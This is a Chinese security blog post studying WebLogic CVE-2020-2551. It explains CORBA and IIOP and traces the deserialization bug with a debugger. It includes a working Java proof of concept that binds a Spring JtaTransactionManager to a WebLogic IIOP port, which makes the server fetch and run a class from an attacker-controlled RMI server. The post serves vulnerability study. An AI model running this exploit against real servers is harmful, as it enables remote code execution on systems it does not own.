# weblogic-CVE-2020-2551-IIOP 反序列化学习记录 - tr1ple - 博客园

> 原文：[`www.cnblogs.com/tr1ple/p/12483235.html`](https://www.cnblogs.com/tr1ple/p/12483235.html)

# CORBA：

具体的对 CORBA 的介绍安全客这篇文章[`www.anquanke.com/post/id/199227`](https://www.anquanke.com/post/id/199227#h3-7)说的很详细，但是完全记住是不可能的，我觉得读完它要弄清以下几个点：

1.什么是 CORBA？

CORBA 全称（Common ObjectRequest Broker Architecture）也就是公共对象请求代理体系结构，是 OMG（对象管理组织）制定的一种标准的面向对象应用程序体系规范。其提出是为了解决不同应用程序间的通信，曾是分布式计算的主流技术。

2.CORBA 能干什么？

实现远程对象的调用

3.CORBA 分为几部分？

```
naming service  //个人感觉类似于 RMI 的注册表服务
client side
servant side
```

4.CORBA 的通信流程是怎样的？

从大体上了解通信流程是怎样的，这里借用里面的图：

![](img/2e49799ce352514705bd707c39d0fae3.png)

```
1.启动 orbd 作为 naming service，会创建 name service 服务。
2.corba server 向 orbd 发送请求获取 name service，协商好通信格式
3.orbd 返回保存的 name service
4.corba server 拿到 name service 后将具体的实现类绑定到 name service 上，这个时候 orbd 会拿到注册后的信息，这个信息就是 IOR。
5.corba client 向 orbd 发起请求获取 name service。
6.orbd 返回保存的 name service。
7.corba client 在 name service 中查找已经注册的信息获取到“引用”的信息(corba server 的地址等)，通过 orb 的连接功能将远程方法调用的请求转发到 corba server。
8.corba server 通过 orb 接收请求，并利用 POA 拦截请求，将请求中所指定的类封装好，同样通过 orb 的连接功能返回给 corba client。
```

以上 1-4 步主要为服务端参与，即完成服务端去注册类的信息，每个类对应一个 IOR，里面包含对所注册的类的描述信息

以上 5-8 步主要为客户端通过 orb 来获取 name service，然后在注册信息中查找想要调用的类的“引用”，拿到 stub，然后调用方法，经 orb 传到服务端被 poa 拦截后处理只将结果返回给客户端，所以方法执行不在客户端，为 rpc（远程过程调用）

5.CORBA 用来进行数据传输的协议是什么？

GIOP 全称（General Inter-ORB Protocol）通用对象请求协议。GIOP 针对不同的通信层有不同的具体实现，而针对于 TCP/IP 层，其实现名为 IIOP（Internet Inter-ORB Protocol）。所以说通过 TCP 协议传输的 GIOP 数据可以称为 IIOP。而 ORB 与 GIOP 的关系是 GIOP 起初就是为了满足 ORB 间的通信的协议。所以也可以说 ORB 是 CORBA 通信的媒介。

6.什么是 ORB？

`orb 就是（Object Request Broker）对象请求代理，`充当客户端与服务端通信的媒介，而客户端或服务端想要调用`orb`来发送/处理请求就需要`Stub`和`skeleton`，这两部分的具体实现就是`Stub`与`POA`。

7.什么是 ORBD？

ORBD 可以理解为 ORB 的守护进程，其主要负责建立客户端(`client side`)与服务端(`servant side`)的关系，同时负责查找指定的 IOR(可互操作对象引用，是一种数据结构，是 CORBA 标准的一部分)。ORBD 是由 Java 原生支持的一个服务，其在整个 CORBA 通信中充当着`naming service`的作用，所以客户端和服务端要使用 ORB，都要指定 ORBD 的端口和地址。

8.什么是 stub 和 poa？

`Stub`是`client side`调用`orb`的媒介，`POA`是`servant side`用于拦截`client`请求的媒介，而两者在结构上其实都是客户端/服务端调用`orb`的媒介

9.stub 的生成方式是什么？

客户端 stub 的生成方式(不只以下三种)：

```
首先获取 NameServer，后通过 resolve_str()方法生成（NameServer 生成方式）
使用 ORB.string_to_object 生成（ORB 生成方式）
使用 javax.naming.InitialContext.lookup()生成（JNDI 生成方式）
```

而以上三种方法都可以总结成两步：

```
从 orbd 获取 NameService，NameService 中包含 IOR
根据 IOR 的信息完成 rpc 调用
```

10.IOR 中包含什么？

```
type_id：用于指定本次（资料库或者说是引用）注册的 id（实际上是接口类型，就是用于表示接口的唯一标识符），用于实现类型安全。
Profile_host、Profile_port：servant side 地址。
Profile ID：指定了 profile_data 中的内容，例如这里的 TAG_INTERNET_IOP 所指定的就是 IIOP Profile。
Codebase：用于获取 stub 类的远程位置。通过控制这个属性，攻击者将控制在服务器中解码 IOR 引用的类 
```

11.CORBA 数据的特点是什么？

CORBA 的数据传递与传统的序列化传输方式不同，即在二进制流中没有`ac ed 00 05`的标识，所以单纯从流量的角度是很难识别的，只能从流量上下文中进行识别。

12.编写一个 Java CORBA IIOP 远程调用步骤：

```
1.使用 idl 定义远程接口
2.使用 idlj 编译 idl，将 idl 映射为 Java，它将生成接口的 Java 版本类以及存根和骨架的类代码文件，这些文件使应用程序可以挂接到 ORB。在远程调用的客户端与服务端编写代码中会使用到这些类文件。
3.编写服务端代码
4.编写客户端代码
5.依次启动命名服务->服务端->客户端
```

由上面的话可以明白服务端挂到 ORB 上的类必须给客户端生成用于 IIOP 通信的客户端和服务端类，客户端与服务端的通信依靠着 stub，stub 从 orb 中拿

corba 的 iiop 需要字节编写 idl 接口，并且编译成 java 类，比较麻烦，所以有了 rmi-iiop，结合了 rmi 的优点，RMI-IIOP 克服了 RMI 只能用于 Java 的缺点和 CORBA 的复杂性（可以不用掌握 IDL)

# rmi-iiop 例子

服务端代码：

```
package com.longofo.example; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import java.util.Hashtable; public class HelloServer { public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory"; public static void main(String[] args) { try {
            System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/"); //设置 codebase 地址 //实例化 Hello servant
            HelloImpl helloRef = new HelloImpl(); //要绑定的类 //使用 JNDI 在命名服务中发布引用
            InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050"); 
            initialContext.rebind("HelloService", helloRef); //通过定义命名 HelloService 对应要绑定的类(实际上绑定的为实例)

            System.out.println("Hello Server Ready...");

            Thread.currentThread().join();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    } private static InitialContext getInitialContext(String url) throws NamingException {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY); //初始化上下文
        env.put(Context.PROVIDER_URL, url); return new InitialContext(env);
    }
}
```

客户端代码：

```
package com.longofo.example; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import javax.rmi.PortableRemoteObject; import java.util.Hashtable; public class HelloClient { public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory"; public static void main(String[] args) { try {
            InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050"); //从命名服务获取引用，拿到 stub
            Object objRef = initialContext.lookup("HelloService"); //narrow 引用为具体的对象
            HelloInterface hello = (HelloInterface) PortableRemoteObject.narrow(objRef, HelloInterface.class);
            EvilMessage message = new EvilMessage(); //发送该对象到服务端，服务端收到后将会还原该对象，即调用该类的 readObject
            message.setMsg("Client call method sayHello...");
            hello.sayHello(message);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    } private static InitialContext getInitialContext(String url) throws NamingException {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url); return new InitialContext(env);
    }
}
```

首先要为客户端和服务端针对 HelloImpl 接口生成为了进行远程调用所需要的类

![](img/992a1bad9f1235eef1a1474db256d50a.png)

 ![](img/d69ab410e89afd6a94fb82a387d46eb4.png)

 此时新生成了两个文件，一个 tie 是服务端用的，一个 stub 是客户端用的

![](img/b514db7ed160495f1449116acc5482c6.png)

![](img/4ded896f83cf89449d6dbfd2285bf53b.png)

 那么服务端实际上只完成的是匹配 sayhello 方法和反射调用，客户端主要定义了服务端可调用的 sayhello 方法的基本架构，那你客户端只有拿到这个 stub 才能调用远程对象的方法就说的通了，只要将这个类文件托管到 orb 上，orbd 对接收到的客户端的 iiop 请求进行匹配，若是请求名是对应为对该类文件的绑定，则进行该类文件的分发，客户端拿到该类文件实际上就是拿到 stub，然后客户端本地在通过该 stub 来实现所谓的远程调用

![](img/9f0c25bff967bc95bf74a6cd7620e36d.png)

然后再启动 orbd 进程，作为实际的 orb 操作者，监听 1050 端口，然后再启动服务端

![](img/4ee07adf2d2d0d69609c57d18e8a4f85.png)

 之后启动客户端调用 sayhello 的同时发送 message 对象，此时因为服务端收到 message 对象

![](img/b039eb3ceda401ce6e89e9343f91bb8a.png)

并且调用了其 readObject 方法，当然这里作为实验只是重写了 readObject 方法，那么如果服务器端本地有可以利用的 gadget，并且可调用的方法的入口参数也为 object 类型，那么同样可以打，但是这里和之前学习 rmi 调用时存在的洞很类似，利用的限制条件还是比较高的，首先客户端也要有你服务器端反序列化的该类的定义，并且报名类名得完全一致才可以

 ![](img/9ac638dd5e861261083c2de8467051e9.png)

 后面也示范了动态类加载的机制，也就是和 rmi 一样，反序列化过程中本地找不到需要的 class 将去 codebase 指定的地址进行记载。

# Weblogic 中的 RMI-IIOP

Weblogic 默认是开启了 iiop 协议的，但是如果想要如上述流程来打 weblogic，那么就要找到 weblogic 中绑定到 orb 的类必须得给客户端和服务端生成远程调用的两种类，然而 Weblogic 默认绑定了远程名称的实现类没有为 IIOP 实现服务端类与客户端类，但是没有绑定的一些类却实现了，所以默认无法利用了的正是服务端去绑定类的时黑名单的绕过，weblogic 安装可以参考[`blog.csdn.net/acmman/article/details/70093877`](https://blog.csdn.net/acmman/article/details/70093877)这篇文章，因为要对 weblogic 进行 debug，因此在 user_projects\domains\base_domain 的 startWebLogic.cmd 文件中中设置 debug 标志

 ![](img/d1c82ed0d7e24ea4c679dcebf0db8d3b.png)

接下来配置 idea，添加 debug 要依赖的 jar 包

![](img/3014c85c3556801e4b632c347a338c0f.png)

添加 debug 链接选项，端口就写上面 weblogic 开的 debug 端口

 ![](img/33fdaa24d12e05e77ea0f6f53687a89f.png)

poc：

```
public class Main { public static void main(String[] args) throws Exception {
        String ip = "192.168.3.247";
        String port ="7001";
        String rmiurl = "rmi://192.168.3.199:1099/Exploit";
        String rhost = String.format("iiop://%s:%s", ip, port);
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put("java.naming.provider.url", rhost);
        Context context = new InitialContext(env);

        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName(rmiurl);
        context.bind("tr1ple", jtaTransactionManager);

}
    }
```

这里用到了一个入口类 org.springframework.transaction.jta.JtaTransactionManager，该类在之前在 spring 里就爆出过 jndi

## spring-jndi：

先本地测试一下这个类：

这里需要添加两个依赖：

```
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-tx</artifactId>
        <version>4.2.4.RELEASE</version>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.springframework/spring-context -->
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-context</artifactId>
        <version>4.2.4.RELEASE</version>
    </dependency>
```

调用栈如下所示：

 ![](img/61ba506466d6fa1ed54a661431b75ff7.png)

那么首先进入该类的 initUserTransactionAndTransactionManager 方法中

 ![](img/60d674423b789a2d183e03640577ddfd.png)

然后将进入 this.lookupUserTransaction 方法中，因为 this.userTransaction 默认为 null

 ![](img/987ceeb6f70eece7f32f62bed4b9f26a.png)

那么此时就看到熟悉的 lookup 函数了，并且此时的 userTransactionName 又是可控的，所以妥妥的 JNDI 注入

 ![](img/4b126763a2315fcac874a2fd644753c8.png)

 ![](img/689bdf877fd876523d6b8ba431ce6242.png)

那么本地起个 rmi referver 即可，那么在 getObjectFactoryFromReference 函数中就会到 rmi server 指定的 codebase 去加载工厂类

![](img/30f5c93faf16056693c3bc4a6ffb5dc4.png)

最终通过 newInstance 实例化工厂类从而触发 calc

 ![](img/a5c7cc0bc3de00c5705247a1770e1773.png)

 ![](img/d208683948c4c6137caf650d314eefb0.png)

 ![](img/febf2e55f4a3c92114d4f047379ee4c7.png)

## cve-2020-2551：

首先根据 poc 的 bind 函数下端点，看一下要进行什么操作，因为在获取上下文时 poc 已经要与 orb 进行一次通信，所以此时数据包：

![](img/d25b64537cef5cdea6dd9946e4ce9fcb.png)

首先客户端 192.168.3.199 向 weblogic 192.168.3.247 请求 locaterequest，这里实际上是请求 nameservice

![](img/6b46b65a69c97e30e4de1f7c52d9848d.png)

然后 orb 返回的数据包中包含命名上下文和 ior

 ![](img/f77d9f80777257e7b936d8ea3162d4aa.png)

然后步入 bind 函数：

![](img/8d8d1edbb7b0dedd6cf657f3f4c5035c.png)

 这里实际上是调用 orb 返回的命名上下文将我们指定的 JtaTransactionManager 实例向 orb 进行绑定

![](img/424fdd5794a3cc63711fb2b0325bc3cf.png)

 接下来在 bind_any 函数中进行序列化数据的构造，这里可以看到 weblogic 用的序列化输出流是 iiopOutputstream，所以在网络中传输的数据流中是看不到原生 objectoutputsteam 的 magic 头部的

![](img/9afdf1f451978c5d4dc2d09e59291071.png)

接着调用 iiopOutputstream 的 write_any 函数写入 jta 类，进一步在 weblogic/corba/idl/AnyImpl 的 write_value 中写入序列化数据

![](img/c2a02e2c8cc705dba10701a8ab8a91d0.png)

接着调用 _invoke 发送序列化数据![](img/13983005f14e325e3e5b5d7f998f5f4d.png)

![](img/a835030b09ad23ce81140ef8b719727d.png)

并最终调用 EndpointImpl 的 send 函数发送上文构造的 iiopoutputstream，可以看到里面的 giop 数据已经在本地构造完成，所以此时 199 将给 orb 发送一条 giop 消息，进行 jta 类实例的绑定

![](img/302dea3cb447ab174c69316a3bf4cf19.png)

![](img/514348cafaceee3d7b8985984e9c542e.png)

那么此时对于 weblogic 而言应该接受到了 giop 消息，所以要对其进行处理，那么序列化用的是 iiopoutputstream，那么反序列化应该用的是 iiopInputstream 输入流，因此找到该类的 read_any 处下断点并发送 poc

![](img/e02bb9159c52f245cef616e7eda31b13.png)

 ![](img/0a639b147983ec3d53aafaef1ad2be9f.png)

 和序列化相对应，此时实例化 AnyImpl 实例调用其 read_value 读取序列化数据，并且在 ValueHandlerImpl.readValue 中从 iiopStream 中拿到 objectInputstream 然后调用 jta 类的 readObject 进行反序列化

 ![](img/13bf0678adbf7d9900a44c03f25288f3.png)

接下来就是之前讲的 spring 的 jndi，weblogic 加载 Exploit.class 从而进行 rce

 ![](img/d1ebb907a02bcaf79f87bfd66c6f8451.png)![](img/989dce1a46e929e5e8e6e2c77d9a81ae.png)

 ![](img/04c537d86f078ef06f517ddd5d9ebe5d.png)

# ![](img/0eccd213b1ec400c7c8570beaa4286c8.png)调试时注意问题：

因为这里实际上是模拟服务端来向 orb 绑定，因此服务端相对于 orb 来说也是一个客户端，这里要用到 orbhelper 来获取命名服务

![](img/16ec90a43aa2f220689272a22e69c87d.png)

而 getORBhelper 里面会判断当前是不是瘦客户端

 ![](img/a9fd8a98e12f2dacb2c849267ba25f81.png)

 因为要模拟服务器端所以，这里必须让 thinClient 为 false，因此这个静态代码快必须到捕获异常块

![](img/1c0ac9e462d9edc4468fc3df3bc4a2c2.png)

# 总结： 

整个攻击过程就是假冒服务端来进行类实例的绑定而与 weblogic 进行 giop 通信发送序列化数据，而 weblogic 接收到序列化数据再进行实例还原，整个流程没问题，主要还是 weblogic 本身在反序列化是没有对类黑名单做好限制。当然在分析过程中抓包来分析通信也更能清晰了解网络通信流程，也更有助于我们理解漏洞原理。

weblogic-cve-2020-2551 IIOP 反序列化导致远程代码执行漏洞，主要是 IIOP 支持 RMI 方式的远程方法调用，所以在 CORBA 这种通信架构中可以伪造服务端和 ORB 通信，在获取到 context 后，绑定恶意的远程调用类到 ORB，加上黑名单校验不严，存在 springboot 的 jndi 注入的 gadget，因此导致回连恶意的 rmi server 造成加载我们构造的任意字节码来 RCE

# 参考：

1.[`www.anquanke.com/post/id/196555`](https://www.anquanke.com/post/id/196555) 讲 java corba 的文章

2.[`www.anquanke.com/post/id/175738`](https://www.anquanke.com/post/id/175738)  基于攻击流量和日志对 Weblogic 各类漏洞的分析思路

3.[`www.anquanke.com/post/id/177546`](https://www.anquanke.com/post/id/177546)  WebLogic 多个 CVE XXE 漏洞分析

4.[`www.anquanke.com/post/id/180725`](https://www.anquanke.com/post/id/180725)   浅谈 Weblogic 反序列化——XMLDecoder 的绕过史

5.[`www.anquanke.com/post/id/195865#h2-2`](https://www.anquanke.com/post/id/195865#h2-2)  t3 反序列化

7.[`www.anquanke.com/post/id/199227`](https://www.anquanke.com/post/id/199227) 讲 corba 的原理

9.[`www.anquanke.com/post/id/184068#h2-14`](https://www.anquanke.com/post/id/184068#h2-14) 讲 weblogic 很详细

10.[`blog.csdn.net/acmman/article/details/70093877`](https://blog.csdn.net/acmman/article/details/70093877) weblogic 安装

11.[`www.anquanke.com/post/id/199966`](https://www.anquanke.com/post/id/199966) cve 2020-2551 

12.[`xz.aliyun.com/t/7374#toc-9`](https://xz.aliyun.com/t/7374#toc-9)  cve 2020-2551 

13.[`www.anquanke.com/post/id/199695#h3-2`](https://www.anquanke.com/post/id/199695#h3-2)   cve 2020-2551 [](https://www.anquanke.com/post/id/199695#h3-2) 

14.[`www.anquanke.com/post/id/197605`](https://www.anquanke.com/post/id/197605)  iiop 反序列化